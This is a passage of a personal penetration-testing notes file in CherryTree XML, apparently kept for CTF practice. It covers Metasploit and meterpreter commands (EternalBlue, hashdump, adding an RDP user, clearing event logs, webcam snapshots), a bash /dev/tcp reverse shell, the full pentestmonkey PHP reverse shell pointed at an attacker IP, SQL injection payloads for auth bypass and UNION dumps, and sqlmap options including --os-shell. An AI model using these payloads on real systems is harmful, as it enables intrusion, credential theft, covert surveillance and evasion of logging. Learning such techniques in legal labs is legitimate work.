				<node custom_icon_id="0" foreground="" is_bold="False" name="sudo -l" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720867.98" ts_lastsave="1589758821.93" unique_id="326">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="~/.local/share/Trash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587234129.77" ts_lastsave="1589758822.86" unique_id="376">
					<rich_text>
</rich_text>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="log output" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587481955.96" ts_lastsave="1589758840.62" unique_id="426">
			<rich_text>&gt; (doesnt show stdout on console) or tee(does)

append:
&gt;&gt; OR tee -a FILE</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587379241.13" ts_lastsave="1589872322.26" unique_id="391">
			<rich_text>use exploit/windows/smb/ms17_010_eternalblue
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Modules" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587475309.1" ts_lastsave="1589761185.12" unique_id="151">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="auxiliary" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587475325.7" ts_lastsave="1589761270.85" unique_id="414">
					<rich_text>Auxiliary modules include port scanners, fuzzers, sniffers, and more.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@kali:~# </rich_text>
					<rich_text foreground="#13c16a">ls /usr/share/metasploit-framework/modules/auxiliary/</rich_text>
					<rich_text>
admin    client   dos         gather  scanner  spoof  vsploit
analyze  crawler  example.rb  parser  server   sqli
bnat     docx     fuzzers     pdf     sniffer  voip
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
There could be a scanner for given exploit, so you can test vulnerabilty before you attack. The exploit might have this functionality built-in. show options may reveal.</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="encoders" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587475331.02" ts_lastsave="1587475333.01" unique_id="415">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587475319.74" ts_lastsave="1589761155.31" unique_id="412">
					<rich_text>In the Metasploit Framework, exploit modules are defined as modules that use payloads.

root@kali:~# </rich_text>
					<rich_text foreground="#13c16a">ls /usr/share/metasploit-framework/modules/exploits/</rich_text>
					<rich_text>
aix        bsdi        firefox  irix       multi    solaris
android    dialup      freebsd  linux      netware  unix
apple_ios  example.rb  hpux     mainframe  osx      windows</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="nops" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587475349.22" ts_lastsave="1587475349.22" unique_id="417">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="payloads" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587475322.47" ts_lastsave="1589761119.19" unique_id="413">
					<rich_text>is apt, advanced persistent threat

</rich_text>
					<rich_text scale="h3">Payloads, Encoders, Nops</rich_text>
					<rich_text>
Payloads consist of code that runs remotely, while encoders ensure that payloads make it to their destination intact. Nops keep the payload sizes consistent across exploit attempts.


root@kali:~# ls /usr/share/metasploit-framework/modules/payloads/
singles  stagers  stages
root@kali:~# ls /usr/share/metasploit-framework/modules/encoders/
cmd  generic  mipsbe  mipsle  php  ppc  ruby  sparc  x64  x86
root@kali:~# ls /usr/share/metasploit-framework/modules/nops/
aarch64  armle  mipsbe  php  ppc  sparc  tty  x64  x86</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="post" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587475345.02" ts_lastsave="1589749265.25" unique_id="416">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="additional modules" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589761185.42" ts_lastsave="1589761185.58" unique_id="523">
					<rich_text scale="h3">Loading Additional Module Trees</rich_text>
					<rich_text>
Metasploit gives you the option to load modules either at runtime or after msfconsole has already been started. Pass the </rich_text>
					<rich_text foreground="#000099">-m</rich_text>
					<rich_text> option when running msfconsole to load additional modules at runtime:
root@kali:~# </rich_text>
					<rich_text foreground="#13c16a">msfconsole -m ~/secret-modules/</rich_text>
					<rich_text>If you need to load additional modules from with msfconsole, use the </rich_text>
					<rich_text foreground="#000099">loadpath</rich_text>
					<rich_text> command:
msf &gt; </rich_text>
					<rich_text foreground="#13c16a">loadpath</rich_text>
					<rich_text>
Usage: loadpath &lt;/path/to/modules&gt;

Loads modules from the given directory which should contain subdirectories for
module types, e.g. /path/to/modules/exploits

msf &gt; </rich_text>
					<rich_text foreground="#13c16a">loadpath /usr/share/metasploit-framework/modules/</rich_text>
					<rich_text>
Loaded 399 modules:
    399 payloads</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="msfconsole" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587379248.98" ts_lastsave="1589873172.29" unique_id="393">
				<rich_text>interactive metasploit framework

1. we selected a module
2. set the correct payload
3. set our options 
4. run the exploit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
^Z to background command shell</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="show payloads" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468883.85" ts_lastsave="1589753456.01" unique_id="407">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="meterpreter" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468985.87" ts_lastsave="1589872946.69" unique_id="410">
						<rich_text>Gives you interactive access to not only control a machine via a shell, but can take screenshots of the machine, easily upload/download files and much much more. When you're searching through the payloads, find where it says &quot;meterpreter&quot;. Meterpreter is deployed entirely in memory and injects itself into other existing system processes. Thats why blue team hates it.

meterpreter can do dir, ls, cat etc. Basically, you never wanna leave meterpreter =)


Commands in subnode.

!!Use double slashes!!1</rich_text>
						<node custom_icon_id="0" foreground="" is_bold="False" name="ps" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589753427.33" ts_lastsave="1589753484.05" unique_id="506">
							<rich_text>list processes
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589753376.25" ts_lastsave="1589753479.54" unique_id="505">
							<rich_text>WIN: runs cmd
you can 'whoami' after</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="hashdump" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589753738.95" ts_lastsave="1589872768.21" unique_id="507">
							<rich_text>hashdump
-or-
run post/windows/gather/hashdump

The hashdump post module will dump the contents of the SAM database.
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="migrate" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589754529.82" ts_lastsave="1589754530.95" unique_id="509">
							<rich_text>MSF “hashdump” post modülünü çalıştırabilmek için, SYSTEM hakları ile çalışan bir proses yetkisine sahip olmak gereklidir. Yerel yönetici haklarına sahip olunması durumunda SYSTEM yetkilerine sahip bir prosese sıçranmalı veya SYSTEM yetkilerine sahip bir prosesin kimliğine bürünülmelidir. İşletim sisteminin ve çalışan prosesin mimarisinin (32 bit veya 64 bit) bir önemi bulunmamaktadır.</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="add user for rdp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589758676.15" ts_lastsave="1589759158.9" unique_id="512">
							<rich_text>#adds a user for rdp POGGERS
run getgui -u thmyris -p password   

then you can use 'rdesktop'</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="search files" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589759194.28" ts_lastsave="1589759246.08" unique_id="517">
							<rich_text>search -f flag*.txt

cat C:\\Windows\\System32\\flag1.txt</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="sysinfo" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589760165.85" ts_lastsave="1589760171.38" unique_id="520">
							<rich_text>prints system information</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="getuid" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589760527.65" ts_lastsave="1589760543.09" unique_id="521">
							<rich_text>whoami for meterpreter
prints user id</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="CLEAREV" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872669.93" ts_lastsave="1589872695.99" unique_id="418">
							<rich_text>clear windows event viewer :^)</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="download" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872703.21" ts_lastsave="1589873013.76" unique_id="544">
							<rich_text>download a file from target to your pc</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="upload" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589873014.12" ts_lastsave="1589873015.79" unique_id="552">
							<rich_text>upload a file from your pc to target pc</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="edit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872741.6" ts_lastsave="1589872746.42" unique_id="545">
							<rich_text></rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="execute" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872746.8" ts_lastsave="1589872746.8" unique_id="546">
							<rich_text></rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="idletime" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872784.89" ts_lastsave="1589872790.95" unique_id="547">
							<rich_text></rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="ipconfig" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872791.33" ts_lastsave="1589872799.24" unique_id="548">
							<rich_text></rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="help" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872799.59" ts_lastsave="1589872843.76" unique_id="549">
							<rich_text></rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="lcd &amp; lpwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872844.12" ts_lastsave="1589872883.56" unique_id="550">
							<rich_text>local cd
local pwd
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="resource" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872883.92" ts_lastsave="1589873043.54" unique_id="551">
							<rich_text>bookmarks for quickly executing files</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="webcam_list" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589873043.93" ts_lastsave="1589873063.35" unique_id="553">
							<rich_text></rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="webscam_snap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589873063.76" ts_lastsave="1589873092.46" unique_id="554">
							<rich_text>take a :) shot and download it

webcam_snap -i 1 -v false</rich_text>
						</node>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="usual variables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587480541.85" ts_lastsave="1589871913.34" unique_id="422">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="lhost &amp; lport" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468291.81" ts_lastsave="1589749201.88" unique_id="406">
						<rich_text>MY MACHINE'S ip:port
so the Metasploit payload knows where to connect back to.</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="rhost &amp; rport" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468254.16" ts_lastsave="1589749210.11" unique_id="405">
						<rich_text>TARGET ip:port</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="TARGETURI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587480532.03" ts_lastsave="1589749216.35" unique_id="421">
						<rich_text>url?
</rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="use &lt;module&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468182.81" ts_lastsave="1589872523.07" unique_id="403">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="exploit / run" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872523.39" ts_lastsave="1589872537.53" unique_id="543">
					<rich_text>gogogogo</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="back" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587476080.5" ts_lastsave="1587476080.5" unique_id="419">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="help" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587469781.75" ts_lastsave="1587475685.88" unique_id="411">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="search" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468171.07" ts_lastsave="1587475959.8" unique_id="402">
					<rich_text>Args:
type:exploit
platform:windows
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="show" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468224.2" ts_lastsave="1589872155.66" unique_id="404">
					<rich_text>show
show options    #exploit &amp; payload configuration</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="options" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872156.1" ts_lastsave="1589872204.69" unique_id="541">
					<rich_text>#exploit &amp; payload configuration</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="advanced" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872205.17" ts_lastsave="1589872206.11" unique_id="542">
					<rich_text>advanced options</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="sessions" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589752570.85" ts_lastsave="1589760472.53" unique_id="503">
					<rich_text>prints background sessions
(that were backgrounded with ^Z)

Usage:
--^Z shell first--
Upgrade shell to meterpreter:
sessions -u 1           # NOTE: uses a different port

- or -

use post/multi/manage/shell_to_meterpreter
msf post(shell_to_meterpreter) &gt; set session 1
msf post(shell_to_meterpreter) &gt; exploit</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="tips" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872043.07" ts_lastsave="1589872100.02" unique_id="539">
					<rich_text></rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="info" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589872100.34" ts_lastsave="1589872105.49" unique_id="540">
					<rich_text>info about chosen exploit</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="-j" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589873172.67" ts_lastsave="1589873202.47" unique_id="555">
					<rich_text>run the exploit in the background</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="-i" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589873203.22" ts_lastsave="1589873203.99" unique_id="556">
					<rich_text>allows you to go into interactive mode with a session(&quot;drops you either into a meterpreter or regular shell&quot;)</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Other Interfaces" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587379243.65" ts_lastsave="1587469094.25" unique_id="392">
				<rich_text>other than msfconsole</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="armitage" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587379320.93" ts_lastsave="1587379380.01" unique_id="394">
					<rich_text>gui for the metasploit framework
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="msfcli" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587379380.23" ts_lastsave="1587379415.3" unique_id="395">
					<rich_text>non interactive metasploit framework, &quot;literal commandline tool&quot; according to hackersploit
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="msfvenom" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468925.23" ts_lastsave="1587476111.63" unique_id="408">
					<rich_text>MSFVenom to create custom shellcode</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Tips" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587379542.72" ts_lastsave="1587469157.14" unique_id="396">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="I am speed" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587469147.97" ts_lastsave="1587469147.97" unique_id="409">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="postgresql" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587379561.83" ts_lastsave="1587469150.04" unique_id="397">
						<rich_text>service postgresql start</rich_text>
					</node>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="reverse shells" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633727.99" ts_lastsave="1589696491.39" unique_id="294">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="bash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633729.81" ts_lastsave="1589933911.95" unique_id="295">
				<rich_text>Create:
echo
echo
bash -i &amp;&gt; /dev/tcp/10.9.17.250/9001 0&gt;&amp;1

Find ip: 
ifconfig tun0 | grep inet #tun0 because we're assuming ur connecting through a VPN

Listen:
nc -lvnp 9001

Python Upgraded Shell:              # for up, down history + tab autocomplete

# TARGET MACHINE:
python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
^Z              # throw the unstable shell to background 

# ATTACKER:
stty raw -echo  # immediate keystroke registration
fg              # foreground the background ps
                # at this point you won't be able to type, specify fg, wack enter a lil bit
                # (nc -lvnp 9001 started again)
                # Enter x2
                
# TARGET MACHINE:
export TERM=xterm

</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="php" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589696491.65" ts_lastsave="1589696726.13" unique_id="499">
				<rich_text>This file is big. Theres a shorter version on pentest monkeys cheatsheet, bigger is more robust &amp; also bigger is for the .php file. While the other one is for terminal? uhh???

Host:
nc -lvnp 9001

Remote: Send the file:
&lt;?php
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See </rich_text>
				<rich_text link="webs http://pentestmonkey.net/tools/php-reverse-shell">http://pentestmonkey.net/tools/php-reverse-shell</rich_text>
				<rich_text> if you get stuck.

set_time_limit (0);
$VERSION = &quot;1.0&quot;;
$ip = '10.9.17.250';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit(&quot;ERROR: Can't fork&quot;);
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit(&quot;Error: Can't setsid()&quot;);
		exit(1);
	}

	$daemon = 1;
} else {
	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
}

// Change to a safe directory
chdir(&quot;/&quot;);

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit(&quot;$errstr ($errno)&quot;);
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit(&quot;ERROR: Can't spawn shell&quot;);
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit(&quot;ERROR: Shell connection terminated&quot;);
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit(&quot;ERROR: Shell process terminated&quot;);
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit(&quot;SOCK READ&quot;);
		$input = fread($sock, $chunk_size);
		if ($debug) printit(&quot;SOCK: $input&quot;);
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit(&quot;STDOUT READ&quot;);
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit(&quot;STDOUT: $input&quot;);
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit(&quot;STDERR READ&quot;);
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit(&quot;STDERR: $input&quot;);
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print &quot;$string\n&quot;;
	}
}

?&gt; 



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="SQLi" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587595347.74" ts_lastsave="1589928678.2" unique_id="440">
			<rich_text>hammer' OR 1=1;--            # basic sqli (POST) #return all hammers or everything xD
hammer'+OR+1=1;--            # basic sqli (POST)

select * from users where username = 'administrator' AND password = 'kekw' | diye bir query olsa
administrator'--             # sometimes removes pw check (POST) | quite KEKW

select name, description from products where category = 'gifts' UNION select username, password from users;--

ORACLE:
select * from v$version      # returns db version info

MOST DBS:
select * from information_schema.tables


Blind SQLi:
- blind sqli means there is no output
- some madlads exfiltrate data by placing the data in a dns lookup to a domain you control ???


SQL differences can be:
- Syntax for string concatenation
- Comments
- Batched or stacked queries
- Platform spesific APIs
- Error messages</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="mysql" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587495870.01" ts_lastsave="1589887340.54" unique_id="431">
				<rich_text>WARNING: once ur in, everything you type has to end with this winky boi -&gt; ;


Usage:
mysql -u root --password=ff912ABD* --host 10.10.11.57
show databases;
use &lt;db&gt;;
show tables;
create table test(dno int(255));

def creds:
root:&lt;EMPTY&gt;

</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="mysql information" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589887452.26" ts_lastsave="1589888612.47" unique_id="559">
				<rich_text>sqli mysql info

mysql has(maybe not exclusively):
SLEEP(2)                # sleep(secs)
dual                    # test table
information_schema      # Metadata

construct in your head what the query is like.
select ? from ? where ? like '%hammer%'; -- if its like this

select ? from ? where ? like '%'; --you can input ';-- to end the query right after the (orda varoldugunu dusundugumuz) wildcard. Then you comment out the rest of the query(we know theres another % at the end there). That allows it to dump every selected column on the selected table(which we don't know)

select ? from ? where ? like '%hammer%' AND 1 = SLEEP(2);-- --we are inputting the part after first % which is -&gt; hammer%' AND 1 = SLEEP(2);--dbde ne kadar hammer iceren row varsa her biri icin 2 sn bekle sonra gonder veriyi. --2 tane hammer varsa 4 sn surmeli. --bu bir table ismi icin ozellestirilebilir, o table ismi varsa sleeple bekler, yoksa pat diye yok der =) Output yoksa bile bu yontemle cikarim yapabilirsin.

select ? from ? where ? like '%hammer%' UNION (SELECT 1,2,3 from dual);-- --dual mysqle ozel bir test tablosu, eger cikti goruyorsak bununla ciktiya bir satira ilk 3 sutuna 1,2,3 ekleyebildiysek bingo. Burdan dumplariz herseyi

select ? from ? where ? like '%hammer%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--

select ? from ? where ? like '%hammer%' UNION (SELECT COLUMN_NAME, 2, 3, FROM information_schema.columns WHERE TABLE_NAME= 'users');-- --burda users tablosu oldugnu metadatadan ogrendik




% is wildcard for any</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="mysqldump" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587595437.33" ts_lastsave="1587600257.39" unique_id="441">
				<rich_text>

mysqldump --compact --skip-extended-insert -u root -proot mydb | grep &quot;interesting string&quot;</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="sqlmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587509179.32" ts_lastsave="1589934776.7" unique_id="439">
				<rich_text>when sqlmap finishes it saves the techniques for its next run.

1st run(gather exploit techniques, cache them)(press enter on anything for a fast ride):
sqlmap --url=$ip/pathtodb
sqlmap --url=$ip/pathtodb --forms

2nd run(use cached exploits):
sqlmap -u http://$ip/administrator.php --data 'username=&amp;password=' -a

Args:
--url=URL           or -u URL
--forms             if you are using POST (dont have paremeters like ?id=... in the title; that would be a get method) USE this
--data              ?
-a                  dont use this monkaS (retrieves EVERYTHING, TAKES HOURS)
--dbs               leaks out the databases
    -D DB           database to enumerate
        --tables    dumps the tables of selected db
    -T              which table to enumerate
        --dump      dumps selected table
    -C              which column to enumerate
-g                  Process Google dork results as target URLs???
-p                  parameter, (in </rich_text>
				<rich_text link="webs http://ex.com/?test=1)">http://ex.com?test=1</rich_text>
				<rich_text> the parameter would be test)
--dbms              db name on remote
--level             level of depth ??? (higher = +accuracy, +testcount)
--dump              dump table entries
--dump-all      
--os-shell          Prompt for an interactive operating system shell
--os-pwn            meterpreter or VNC</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="1st order sqli" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589928499.99" ts_lastsave="1589928531.63" unique_id="563">
				<rich_text>the smorc way, you find input you fill input yes</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="2nd order injection" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589888785.8" ts_lastsave="1589928522.59" unique_id="560">
				<rich_text>AKA stored SQLi

make your username an sqli
when you try to change your password your username compromises the db xD
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="SQLi auth bypass" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587308781.2" ts_lastsave="1589927351.4" unique_id="385">
				<rich_text link="webs https://twitter.com/SpiderSec/status/1251793902996279297">https://twitter.com/SpiderSec/status/1251793902996279297</rich_text>
				<rich_text>    
username: '--' / &quot;--&quot; 
password: '--' / &quot;--&quot;</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="ssh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586678952.0" ts_lastsave="1589757017.0" unique_id="150">
			<rich_text>ssh user@10.10.10.125

or

ssh -i id_rsa user@10.10.10.125

THEN
check the public key of the remote server and type 'yes'
if you press Enter it will try to use the preset ssh key and won't work!

id_rsa privelages HAS TO BE:
chmod 600 id_rsa
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some funny stuff:
export DISPLAY=0.0 #enables the ssh to launch gui applications on user account
sudo modprobe pcspkr #enables user accounts speakers, use a program called beep to make stupid noises.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh z@cey</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="sshd_config" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587503270.02" ts_lastsave="1587503270.65" unique_id="434">
				<rich_text>change this and then
systemctl restart sshd
EZ</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Steganography" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587668860.07" ts_lastsave="1587727777.69" unique_id="309">
			<rich_text>if you added a rather large file to an image, the difference will be noticable with human eyes. But! If you take a picture of your dog, and then steghide data in, then only send the modified image and get rid of the original image, people can't substract the 2 images and the data is safer.</rich_text>
